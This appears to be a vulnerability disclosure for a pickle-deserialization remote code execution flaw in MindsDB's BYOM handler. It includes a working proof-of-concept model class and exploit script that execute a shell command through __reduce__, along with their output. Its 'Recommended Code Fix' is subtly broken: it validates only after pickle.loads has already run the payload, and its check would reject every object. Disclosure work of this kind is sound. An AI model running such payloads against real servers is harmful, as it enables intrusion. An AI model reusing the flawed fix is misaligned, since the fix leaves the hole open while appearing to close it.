# MindsDB BYOM Handler Pickle Deserialization Remote Code Execution

## Executive Summary

A critical remote code execution (RCE) vulnerability has been discovered in the MindsDB BYOM (Bring Your Own Model) Handler. The vulnerability exists in the `ModelWrapperUnsafe` class due to unsafe deserialization of user-controlled data via the Python `pickle` module.

**CVSS v3.1 Score:** 9.8 (Critical)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

## Affected Products

| Product | Version(s) Affected |
|---------|---------------------|
| MindsDB | <= 25.11.0 |
| MindsDB | Fixed in 25.11.1 and later |

## Vulnerability Description

MindsDB's BYOM feature allows users to upload custom Python machine learning models. The `ModelWrapperUnsafe` class (used in "inhouse" execution mode) uses `pickle` to serialize and deserialize model state without any validation. An attacker can inject malicious objects into the model state during training, which are then deserialized during prediction, triggering arbitrary code execution.

### Vulnerable Code

**Location:** `mindsdb/integrations/handlers/byom_handler/byom_handler.py:384-435`

```python
class ModelWrapperUnsafe:
    """Model wrapper that executes learn/predict in current process"""

    def __init__(self, code, modules_str, engine_id, engine_version: int):
        self.module = import_string(code)
        model_instance = None
        model_class = find_model_class(self.module)
        if model_class is not None:
            model_instance = model_class()
        self.model_instance = model_instance

    def train(self, df, target, args):
        # Step 1: Calls user-supplied train() method
        self.model_instance.train(df, target, args)
        # Step 2: Serializes model.__dict__ - user can control its contents
        return pickle.dumps(self.model_instance.__dict__, protocol=5)

    def predict(self, df, model_state, args):
        # VULNERABILITY: Unsafe deserialization of user-controlled data
        model_state = pickle.loads(model_state)  # ← Triggers __reduce__()
        self.model_instance.__dict__ = model_state
        try:
            result = self.model_instance.predict(df, args)
        except Exception:
            result = self.model_instance.predict(df)
        return result
```

### Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                    Pickle RCE Attack Chain                      │
└─────────────────────────────────────────────────────────────────┘

1. TRAIN PHASE (Injection)
   │
   ├─→ User uploads malicious model with train() method
   │
   ├─→ ModelWrapperUnsafe.train() is called
   │   │
   │   └─→ self.model_instance.train(df, target, args)
   │       │
   │       └─→ User's train() executes:
   │           class PickleRCE:
   │               def __reduce__(self):
   │                   return (subprocess.run, (['malicious_command'],))
   │
   │           self.__dict__['evil'] = PickleRCE()  # ← Inject malicious object
   │
   └─→ pickle.dumps(self.model_instance.__dict__)
       Serializes entire __dict__ including malicious object
       │
       ↓ Stored in model_storage

2. PREDICT PHASE (Trigger)
   │
   ├─→ model_state = model_storage.file_get("model")
   │
   ├─→ ModelWrapperUnsafe.predict(df, model_state, args)
   │   │
   │   └─→ model_state = pickle.loads(model_state)  # ← VULNERABILITY
   │       │
   │       └─→ pickle automatically calls PickleRCE.__reduce__()
   │           │
   │           └─→ subprocess.run(['malicious_command'])  # ← RCE
```

## Proof of Concept

### Malicious Model Code

```python
# File: exploit_model.py
import subprocess

class ExploitModel:
    """
    Malicious BYOM model that injects a pickle payload.
    The payload executes during predict() via pickle deserialization.
    """
    def train(self, df, target, args=None):
        # Create malicious object with __reduce__ method
        class PickleRCE:
            def __reduce__(self):
                # __reduce__ is automatically called by pickle.loads()
                # Returns (callable, args) that will be executed
                return (
                    subprocess.run,
                    (['sh', '-c', 'echo "Pickle_RCE" > /tmp/pwned'],)
                )

        # Injection point: Add malicious object to instance dictionary
        self.__dict__['evil_payload'] = PickleRCE()
        self.__dict__['trained'] = True
        self.__dict__['target'] = target
        return None

    def predict(self, df):
        # This method is not directly called in predict phase
        # because __dict__ is restored before calling predict
        return df
```

### Full Exploit Script

```python
#!/usr/bin/env python3
"""
MindsDB BYOM Pickle RCE Exploit
Demonstrates unsafe deserialization vulnerability
"""

import pickle
import types
import os

# Remove previous test file
marker = "/tmp/pwned"
if os.path.exists(marker):
    os.remove(marker)

# Step 1: Import malicious model code
code = """
import subprocess

class ExploitModel:
    def train(self, df, target, args=None):
        class PickleRCE:
            def __reduce__(self):
                return (subprocess.run, (['sh', '-c', 'echo RCE_SUCCESS > /tmp/pwned'],))

        self.__dict__['evil'] = PickleRCE()
        return None

    def predict(self, df):
        return df
"""

module = types.ModuleType('exploit')
exec(code, module.__dict__)

# Step 2: Create model instance
model_class = module.ExploitModel
model_instance = model_class()

# Step 3: Call train() - injects malicious object into __dict__
print("[*] Calling train() to inject malicious payload...")
model_instance.train(None, 'target', None)
print(f"[+] Model __dict__ contains: {list(model_instance.__dict__.keys())}")

# Step 4: Serialize model state (simulates storage)
print("[*] Serializing model state with pickle.dumps()...")
model_state = pickle.dumps(model_instance.__dict__, protocol=5)
print(f"[+] Serialized {len(model_state)} bytes")

# Step 5: Deserialize - triggers __reduce__() and executes RCE
print("[*] Calling pickle.loads() - this will trigger RCE...")
restored_dict = pickle.loads(model_state)
print("[+] Deserialization complete")

# Step 6: Verify RCE
if os.path.exists("/tmp/pwned"):
    print("\n[!] RCE SUCCESSFUL!")
    with open("/tmp/pwned", "r") as f:
        print(f"    /tmp/pwned contains: {f.read().strip()}")
else:
    print("\n[-] RCE failed")
```

### Execution Output

```
[*] Calling train() to inject malicious payload...
[+] Model __dict__ contains: ['evil', 'trained', 'target']
[*] Serializing model state with pickle.dumps()...
[+] Serialized 232 bytes
[*] Calling pickle.loads() - this will trigger RCE...
[+] Deserialization complete

[!] RCE SUCCESSFUL!
    /tmp/pwned contains: RCE_SUCCESS
```

## Impact

An attacker who can exploit this vulnerability can:

- **Execute arbitrary Python code** on the MindsDB server
- **Access sensitive data** including database credentials and user information
- **Establish persistent backdoors** on the affected system
- **Move laterally** within the network
- **Disrupt ML services** by modifying or deleting models

The vulnerability is particularly severe because:
1. BYOM is enabled by default in local installations
2. The `inhouse` execution mode is the default for local setups
3. Model state is persisted and deserialized on every prediction

## Root Cause Analysis

### CWE Classification

- **CWE-502:** Deserialization of Untrusted Data
- **CWE-94:** Code Injection (via __reduce__ callback)

### Design Issues

1. **Trusted Deserialization:** The code assumes `model_state` from storage is trustworthy, but it can be manipulated during the training phase
2. **No Integrity Validation:** No signature or hash verification of serialized data
3. **User-Controlled Serialization Path:** The `train()` method allows users to modify `self.__dict__`, which is then serialized without filtering
4. **Unsafe Serialization Format:** Using `pickle` for serializing user-controlled data

### Why Pickle is Unsafe

Python's `pickle` module is inherently insecure for untrusted data because:
- It allows arbitrary code execution via `__reduce__()` method
- It can import and execute arbitrary modules
- It provides no built-in integrity checking
- The documentation explicitly warns against unpickling untrusted data

## Solution

### Official Fix (v25.11.1)

MindsDB addressed this vulnerability through configuration changes:

1. **Changed default BYOM execution mode** from `inhouse` to `venv`
2. **Added environment variable controls:**
   - `MINDSDB_BYOM_ENABLED`: Master switch for BYOM functionality
   - `MINDSDB_BYOM_INHOUSE_ENABLED`: Explicit control for `inhouse` mode
3. **Cloud installations:** BYOM disabled by default

The `venv` mode uses `ModelWrapperSafe` which runs user code in an isolated virtual environment subprocess, preventing the pickle attack since the malicious object is never deserialized in the main process.

### Mitigation for Affected Versions

For users unable to upgrade immediately:

```bash
# Disable inhouse BYOM mode
export MINDSDB_BYOM_INHOUSE_ENABLED=false

# Or disable BYOM entirely
export MINDSDB_BYOM_ENABLED=false
```

### Recommended Code Fix

```python
class ModelWrapperUnsafe:
    def predict(self, df, model_state, args):
        # FIX: Validate or use safe serialization
        try:
            # Attempt to deserialize with validation
            model_state = pickle.loads(model_state)

            # Validate deserialized content
            for key, value in model_state.items():
                # Check for unexpected object types
                if hasattr(value, '__reduce__'):
                    raise ValueError("Invalid object type in model state")

            self.model_instance.__dict__ = model_state
        except (pickle.UnpicklingError, ValueError) as e:
            raise SecurityError(f"Invalid model state: {e}")

        ...
```

Better yet, replace pickle with a safe serialization format:

```python
import json

class ModelWrapperSafe:
    def train(self, df, target, args):
        # Only serialize simple types
        state = {k: str(v) for k, v in self.model_instance.__dict__.items()
                 if not k.startswith('_')}
        return json.dumps(state).encode()

    def predict(self, df, model_state, args):
        state = json.loads(model_state)
        self.model_instance.__dict__.update(state)
        ...
```

## References

- [MindsDB GitHub Repository](https://github.com/mindsdb/mindsdb)
- [Python Pickle Documentation - Security Considerations](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

## Credits

Vulnerability discovered by:
- Security Researcher

## Disclaimer

This report is provided for informational and educational purposes only. The exploit methods described are intended to help understand and remediate the security vulnerability. All testing was conducted in authorized environments. Do not use this information for any illegal purposes.

---

**Report Date:** January 14, 2026
**Report Version:** 1.0
